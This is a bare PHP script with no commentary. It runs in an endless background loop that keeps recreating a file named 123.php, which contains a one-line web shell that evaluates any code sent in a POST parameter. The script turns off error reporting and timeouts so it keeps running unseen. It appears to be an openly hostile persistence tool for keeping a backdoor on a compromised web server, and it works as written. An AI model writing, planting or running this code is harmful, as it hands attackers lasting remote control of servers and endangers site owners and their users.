<?php
error_reporting(0);
ignore_user_abort(true);
set_time_limit(0);
$file = "123.php";
$shell = "<?php\nerror_reporting(0);\neval(\$_POST[123]);?>";
while (TRUE) {
if (!file_exists($file)) {
file_put_contents($file, $shell);
}
usleep(50);
}
?>
